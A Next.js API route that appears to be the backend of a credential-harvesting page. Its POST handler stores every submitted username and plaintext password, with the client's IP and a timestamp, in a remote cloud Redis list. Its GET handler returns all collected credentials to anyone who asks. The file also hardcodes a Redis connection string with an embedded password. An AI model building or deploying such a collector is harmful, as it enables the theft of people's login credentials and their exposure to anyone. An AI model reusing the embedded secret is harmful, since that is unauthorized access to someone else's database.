import { NextRequest, NextResponse } from 'next/server';
import { createClient } from 'redis';

// Define the type for our login data
interface LoginData {
  username: string;
  password: string;
  timestamp: string;
  ip?: string;
}

// Helper function to get client IP
function getClientIP(request: NextRequest): string {
  let ip = request.headers.get('x-forwarded-for') || '';
  ip = ip.split(',')[0].trim();
  
  if (!ip) {
    ip = request.headers.get('x-real-ip') || '';
  }
  
  return ip || 'unknown';
}

// Create Redis client
const redisUrl = process.env.REDIS_URL || "redis://default:TWFhH5wT7FRl66Ghd1X8n6nb8IGLdWzx@redis-19702.c212.ap-south-1-1.ec2.redns.redis-cloud.com:19702";

// Define proper types for Redis client
interface RedisClient {
  connect: () => Promise<void>;
  on: (event: string, callback: (err: Error) => void) => void;
  get: (key: string) => Promise<string | null>;
  set: (key: string, value: string) => Promise<void>;
  quit?: () => Promise<void>;
}

let redisClient: RedisClient | null = null;

async function getRedisClient(): Promise<RedisClient | null> {
  if (!redisClient) {
    // Create Redis client with proper typing
    const client = createClient({
      url: redisUrl
    }) as unknown as RedisClient;
    
    client.on('error', (err: Error) => {
      console.error('Redis Client Error', err);
      redisClient = null;
    });
    
    try {
      await client.connect();
      console.log('Connected to Redis successfully');
      redisClient = client;
    } catch (error) {
      console.error('Failed to connect to Redis:', error);
      redisClient = null;
    }
  }
  return redisClient;
}

export async function POST(request: NextRequest) {
  try {
    const body = await request.json();
    const { username, password } = body;

    // Basic validation
    if (!username || !password) {
      return NextResponse.json(
        { error: 'Username and password are required' },
        { status: 400 }
      );
    }

    // Get IP address
    const ip = getClientIP(request);

    // Create the data object
    const loginData: LoginData = {
      username,
      password,
      timestamp: new Date().toISOString(),
      ip
    };

    try {
      // Try to use Redis
      const client = await getRedisClient();
      if (client) {
        const loginsKey = 'logins';
        const existingLoginsJson = await client.get(loginsKey);
        const existingLogins = existingLoginsJson ? JSON.parse(existingLoginsJson) : [];
        const updatedLogins = [...existingLogins, loginData];
        await client.set(loginsKey, JSON.stringify(updatedLogins));
        console.log('Data stored in Redis successfully');
      } else {
        // Fallback: log to console
        console.log('Login data received (not stored in Redis):', loginData);
      }
    } catch (redisError) {
      console.error('Redis error, falling back to console log:', redisError);
      console.log('Login data received (Redis failed):', loginData);
    }

    return NextResponse.json(
      { message: 'Login data stored successfully' },
      { status: 200 }
    );
  } catch (error) {
    console.error('Error storing login data:', error);
    return NextResponse.json(
      { error: 'Internal server error' },
      { status: 500 }
    );
  }
}

// GET endpoint to retrieve login data
export async function GET() {
  try {
    try {
      // Try to get data from Redis
      const client = await getRedisClient();
      if (client) {
        const loginsKey = 'logins';
        const existingLoginsJson = await client.get(loginsKey);
        const logins = existingLoginsJson ? JSON.parse(existingLoginsJson) : [];
        return NextResponse.json(logins, { status: 200 });
      } else {
        // Fallback: return empty array
        return NextResponse.json([], { status: 200 });
      }
    } catch (redisError) {
      console.error('Redis error, returning empty array:', redisError);
      return NextResponse.json([], { status: 200 });
    }
  } catch (error) {
    console.error('Error reading login data:', error);
    return NextResponse.json(
      { error: 'Internal server error' },
      { status: 500 }
    );
  }
}